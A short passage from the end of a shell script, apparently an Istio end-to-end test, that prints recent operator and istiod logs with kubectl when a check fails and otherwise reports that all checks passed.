  "${KUBECTL[@]}" -n "$OPERATOR_NS" logs deployment/inkwall-operator --tail=40 2>/dev/null || true
  "${KUBECTL[@]}" -n "$ISTIO_NS" logs deployment/istiod --tail=40 2>/dev/null || true
  exit 1
fi
echo "istio e2e: all checks passed"
